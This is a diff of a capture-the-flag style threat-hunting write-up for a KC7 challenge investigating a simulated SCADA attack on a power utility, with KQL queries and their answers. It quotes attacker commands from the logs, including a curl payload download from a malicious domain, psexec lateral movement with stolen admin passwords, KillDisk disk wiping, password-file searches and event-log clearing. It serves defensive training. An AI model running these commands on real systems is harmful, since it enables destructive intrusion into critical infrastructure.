@@ -8,10 +8,10 @@ This promises to be a moderate challenge, with learning objectives of:
 - Identify credential theft through password file searches
 - Find anti-forensic techniques like event log clearing
 
+https://kc7cyber.com/challenges/279
 
 Section 1: SCADA Nada
-We jump right in with no query template to follow, and being asked: How many results are there for processes that contain SCADA in the commandline?
-Luckily, this one is easy enough:
+How many results are there for processes that contain SCADA in the commandline?
 ProcessEvents
 | where process_commandline contains "SCADA"
 Answer: 5
@@ -19,68 +19,59 @@ Answer: 5
 A command was run to scan the network and gather information about SCADA systems. What is the name of the executable that was used to perform this scan?
 I added in this right after "SCADA":
 and process_commandline contains ".exe"
-This will narrow it down to just executables.
-We see this in the first result: C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt
+In the first result: C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt
 Answer: ICSScanner.exe
-Note: To explain the command further, it uses that scanner to scan the network at 192.168.0.0/16 (meaning, the internal network of the organization), for SCADA systems, and outputs the results to a file at C:\ProgramData\SCADA_IPs.txt
 
 Paste the full timestamp for when this process was executed.
-If we scroll back to the left, the very first column is a timestamp: 2024-09-09T11:17:44.000Z
+2024-09-09T11:17:44.000Z
 
-It looks like an external file was downloaded from a suspicious domain. This could be a key part of the attack. 🪲 What command was used to download this file?
-For this one, I took back out the .exe clause, and just used SCADA. Our second result shows: curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt
+What command was used to download this file?
+The second result shows: curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt
 However, it is just asking for the command to download the file itself, not where it came from, so the answer is: curl -o C:\ProgramData\SCADA_Malicious_Commands.txt
-Side note: Curl is used to transfer data from one place to another, usually downloading from a website. Hence, the URL after that portion of the command.
 
-A destructive tool was used to wipe data and cause the SCADA systems to shut down. 🫨 What is the name of the executable that was used to do this?
-If we look to the last command run featuring "SCADA", we will see: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
+What is the name of the executable that was used to do wipe data?
+Look to the last command run featuring "SCADA": for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
   set /p password=<C:\\ProgramData\\Extracted_Password.txt
   psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe"
 )
-What we're looking for here is "KillDisk.exe". It seems self-explanatory - it will wipe the disk.
+Answer: KillDisk.exe
 
 What legitimate Windows tool was exploited to carry out these remote executions?
-I decided to go with:
 ProcessEvents
 | where process_commandline contains "administrator"
-This will filter out command line functions by just the ones containing the word "administrator" (we were told the remote execution was done using administrative credentials). The result shows: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
+The result shows: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
   set /p password=<C:\\ProgramData\\Extracted_Password.txt
   psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
 )
-If we look towards the end, we see -u (for user) administrator, and -p (for password, which appears to be pulled from Extracted_Password.txt. I can gather this because % around a word indicates that it's a variable, and the variable was set one line prior). If we look right before the credentials, we can see that psexec.exe is the command being run.
+Look right before the credentials; psexec.exe is the command being run.
 
 What executable did the theat actor use to establish persistence and perform reconnaissance on the SCADA systems during the attack?
-Let's go back to:
 ProcessEvents
 | where process_commandline contains "SCADA" and process_commandline contains ".exe"
-And our second result shows: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
+The second result shows: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
   set /p password=<C:\\ProgramData\\Extracted_Password.txt
   psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
 )
 This answer can be found in towards the end, as well. BlackEnergy.exe is being copied to the SCADA systems and run.
 
 According to threat intelligence reports, BlackEnergy has been used by a state-sponsored threat actor group known for targeting critical infrastructure, including the 2015 Ukraine power grid attack. What is the name of the group responsible for these attacks?
-This is just open source intelligence. This source should be pretty reliable - https://www.cyber.nj.gov/threat-landscape/malware/trojans/blackenergy
+This is just open source intelligence. This source is reliable - https://www.cyber.nj.gov/threat-landscape/malware/trojans/blackenergy
 Answer: Sandworm
 
 What is the timestamp for the first time BlackEnergy was observed running in the command line on any host in our environment?
-I changed the query to:
 ProcessEvents
 | where process_commandline contains "BlackEnergy"
-And the first result should be the earliest: 2024-08-29T08:28:45.000Z
+And the first result is the earliest: 2024-08-29T08:28:45.000Z
 
 On how many hosts was BlackEnergy present?
-Let's add a line (or two) to the previous query:
 | distinct hostname
 | count
-This will grab all the unique hostnames it was run on, and then count how many there were.
 Answer: 1
 
 What is the hostname where BlackEnergy was found?
-Simply take out the "count" line and we see: BDC0-DESKTOP
+BDC0-DESKTOP
 
 What is the name of the employee that BDC0-DESKTOP belongs to?
-And now we pivot to another table. We know that there's an Employees table that also gives us the hostname that a particular employee uses, so let's try:
 Employees
 | where hostname == "BDC0-DESKTOP"
 Answer: Jibby Saetang
@@ -88,59 +79,53 @@ For future reference: IP address for Jibby - 10.10.0.8, email address - jibby_sa
 Taking notes is important as we may need to pivot back to this user later. Also, MFA disabled? That's not good, especially with systems like SCADA!
 
 What is the employee's role?
-And this is why we take those notes! SCADA Operator
+SCADA Operator
 
 What is the name of the file that the user downloaded, which is likely related to BlackEnergy?
-We are also told in the blurb before the question that we are looking for browsing history. We also know there's an OutboundNetworkEvents table that we can query, so let's go there:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.8" // using our notes from eaarlier!
-This gives us 60 results, which is a lot to go through, but let's look anyway and see if we can find it. If so, we can know how to adjust our queries for next time, perhaps.
-(Side note: I did try adding in a "| where url contains "Black+Energy" clause before to filter on, well, anything related to Black Energy, but no results came up.)
-I see lots of docs.google.com searches, but nothing immediately jumps out as related to Black Energy. However, we do see something from a domain called chicagogridupdates, with a URL of: http://chicagogridupdates.com/published/public/files/images/Urgent_Cyber_Threat_Alert.zip
-That's probably what they're wanting: Urgent_Cyber_Threat_Alert.zip
+This gives us 60 results, which is a lot to go through.
+(Side note: I did try adding in a "| where url contains "Black+Energy" clause before to filter on anything related to Black Energy, but no results came up.)
+I see lots of docs.google.com searches, but nothing immediately jumps out as related to Black Energy. However, I do see something from a domain called chicagogridupdates, with a URL of: http://chicagogridupdates.com/published/public/files/images/Urgent_Cyber_Threat_Alert.zip
+Answer: Urgent_Cyber_Threat_Alert.zip
 
 What is the timestamp for when the user downloaded that file?
-Scroll back over to the left again: 2024-08-29T08:28:01.000Z
+2024-08-29T08:28:01.000Z
 
 What is the SHA256 hash of the file created immediately after the downloaded file?
-And weare given:
 FileCreationEvents
 | where hostname == 'BDC0-DESKTOP'
 | where timestamp >= datetime(2024-08-29T08:28:01Z)
 |take 2
-The logic here is to look at what files were created on this particular machine, and look for those that came AFTER visitng that URL of interest. Then, we are just grabbing 2 results. Luckily, one of the columns given back to us is a SHA256 hash: 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
-(And what do you know it, the file created immediately after the downloaded file listed previously is BlackEnergy.exe)
+SHA256 hash: 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
 
 What process shows the user opening the zip file? (paste the full command)
-I ran:
 ProcessEvents
 | where hostname == "BDC0-DESKTOP"
 | where process_commandline contains "Urgent_Cyber_Threat_Alert.zip"
-This will go back to the processes, filter by the machine of interest, and look for that ZIP folder. There's just one result: Explorer.exe "C:\Users\jisaetang\Downloads\Urgent_Cyber_Threat_Alert.zip"
+There's just one result: Explorer.exe "C:\Users\jisaetang\Downloads\Urgent_Cyber_Threat_Alert.zip"
 
 What is the name of the domain that BlackEnergy beacons to after execution?
 ProcessEvents
 | where hostname == "BDC0-DESKTOP"
 | where process_commandline contains "BlackEnergy.exe"
-This is the query I used. Again, just filtering by the machine of interest and a keyword. We get: BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24
+Results show: BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24
 Answer: chicagogridupdates.com
-Hey, that's the domain we just caught a few questions ago! Things are coming together.
 
 
 Section 2: Phish and Chips
 Which sender address did the threat actor use to target the highest number of employees?
-Ok, throwing us right in now, I see. So first, if we're mentioning sender addresses, we know we need to go to the Email table. Then, we need to probably look for the zip file from earlier in the link column, as well.
 Email
 | where link contains "Urgent_Cyber_Threat_Alert.zip"
-This gives us just 1 email, with a sender of: joseph_eisenman@chicagopowergrid.com (side note: that's internal!)
+This gives us just 1 email, with a sender of: joseph_eisenman@chicagopowergrid.com (side note: that's internal)
 Then, we see the subject of the email and we can search on that:  
 Email
 | where subject contains "Critical: Grid Security Update Required"
 That gives us 3 new addresses: thresher_libero@hotmail.com, elizabeth_nunmaker@chicagopowergrid.com, chopping_asbestosis@verizon.com
-Let's see if we can filter on those addresses:
+Filter on those addresses:
 Email
 | where sender has_any ("thresher_libero@hotmail.com", "elizabeth_nunmaker@chicagopowergrid.com", "chopping_asbestosis@verizon.com", "joseph_eisenman@chicagopowergrid.com")
-That gives us 45 results. Let's see how many each returns, using:
+That gives us 45 results.
 Email
 | where sender == "[use the above addresses]" 
 | count
@@ -148,34 +133,29 @@ thresher_libero@hotmail.com - 5
 elizabeth_nunmaker@chicagopowergrid.com - 16
 chopping_asbestosis@verizon.com - 4
 joseph_eisenman@chicagopowergrid.com - 20
-HOWEVER, 2 of those are internal, and one of the other two only has 4 sent messages while the other has 5. thresher_libero@hotmail.com is the correct answer.
+However, 2 of those are internal. thresher_libero@hotmail.com is the correct answer.
 
 What threat actor controlled IP was used to log in to the most accounts?
-Let's go back to the domain being beaconed to, also known as the C2 domain - chicagogridupdates.com
-Let's now plug that into the PassiveDns table to get the IP(s):
+C2 domain - chicagogridupdates.com
 PassiveDns
 | where domain contains "chicagogridupdates"
 | distinct ip
-We get - 104.244.42.129, 87.250.252.242
-Now, let's go the AuthenticationEvents and search by those IPs and see which one has the most hits:
+Results: 104.244.42.129, 87.250.252.242
 AuthenticationEvents
 | where src_ip == "[IP]"
 | count 
-The first gives 3, the other gives 4
+The first gives 3, the other gives 4.
 
 The attacker performed reconnaissance on two SCADA operators but chose to target only one. Which SCADA operator was not targeted?
-First, let's see who *was* targeted:
+To find who was targeted:
 InboundNetworkEvents
 | where src_ip has_any ("104.244.42.129", "87.250.252.242")
 | where url contains "SCADA"
-This will look for any traffic going into our network from the suspicious IPs. We're also filtering by URLs containing the term "SCADA". If we look at those URLs, we see that those who were targeted are: Waymon Ho, Jibby Saetang, and Wade Wells.
-Let's jot that down and go to the Employees table and find out who has "SCADA" in their role:
 Employees
 | where role contains "SCADA"
 Waymon and Jibby are returned, so the odd one out is Wade Wells.
 
 Which compromised employee’s account was used to send the first phishing email to the final victim?
-Well, we know we're looking for Jibby as the victim, and that the sender is going to be internal, and finally, that the link has to contain the suspicious zip that was downloaded:
 Email
 | where recipient == "jibby_saetang@chicagopowergrid.com"
 | where sender contains "chicagopowergrid.com"
@@ -183,38 +163,32 @@ Email
 Answer: joseph_eisenman@chicagopowergrid.com, or rather: Joseph Eisenman
 
 How many employees in total received phishing emails during the attack?
-I tried:
 Email
 | where sender has_any ("thresher_libero@hotmail.com", "waymon_ho@chicagopowergrid.com", "joseph_eisenman@chicagopowergrid.com", "elizabeth_nunmaker@chicagopowergrid.com", "chopping_asbestosis@verizon.com")
 | where recipient contains "chicagopowergrid"
 | where subject contains "EXTERNAL" or subject contains "urgent" or subject contains "critical" or link contains "Urgent_Cyber_Threat_Alert.zip"
-Let's break it down: I'm looking for any of the suspicious senders we have already identified. I'm also looking for internal recipients, since we're looking for employees. I'm also looking for suspicious subjects and any links to the suspicous zip.
 Answer: 12
 
 What command was used to enumerate the list of domain controllers within the network?
-After a nudge from looking in the Discord, I had a "DUH" moment and simply Googled what command might help us with this, and then queried for it:
+nltest is a command commonly used for this purpose.
 ProcessEvents
 | where process_commandline contains "nltest"
 Answer: nltest /dclist:chicagogrid.local
 
 What file path did the attacker use to store the results of their password file search?
-This one is easy enough:
 ProcessEvents
 | where process_commandline contains "password"
-And we find: dir /s /b C:\*password*.txt > C:\ProgramData\Password_Files.txt
+Result: dir /s /b C:\*password*.txt > C:\ProgramData\Password_Files.txt
 Therefore, answer: C:\ProgramData\Password_Files.txt
 
 What upcoming corporate event did the threat actor browse on the chicagopowergrid.com website?
-Also fairly easy to find:
 InboundNetworkEvents
 | where url contains "chicagopowergrid.com" and url has_any ("corporate", "event")
-This looks for that domain and anything containing "corporate" or "event" in the URL. We find:
 https://chicagopowergrid.com/events/upcoming-corporate-karaoke-night/
 Answer: karaoke night
 
 The attacker attempted to cover their tracks by clearing specific event logs. What command was used to clear the System event log?
-A bit more nudging from hints in the Discord helped me try:
 ProcessEvents
 | where hostname == "BDC0-DESKTOP" // Remember, this is the SYSTEM we know was compromised
 | where process_commandline has "System"
-And we find: wevtutil cl System
+Answer: wevtutil cl System
